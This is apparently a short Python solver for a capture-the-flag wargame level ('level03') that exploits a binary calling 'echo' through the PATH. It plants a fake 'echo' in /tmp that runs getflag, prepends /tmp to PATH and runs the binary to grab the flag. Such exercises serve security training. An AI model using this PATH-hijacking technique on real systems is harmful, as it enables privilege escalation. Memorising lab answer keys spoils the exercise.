from solver.utils import extract_flag

def solve(connection):
	# The binary calls echo from the env: make my own echo that calls getflag
	connection.exec("echo 'getflag' > /tmp/echo && chmod 777 /tmp/echo")
	# Include /tmp in the PATH and run the binary (IMPORTANT: the operations need to be in the same exec call)
	response = connection.exec("export PATH=/tmp:$PATH && ./level03")
	flag = extract_flag(response)
	return "", flag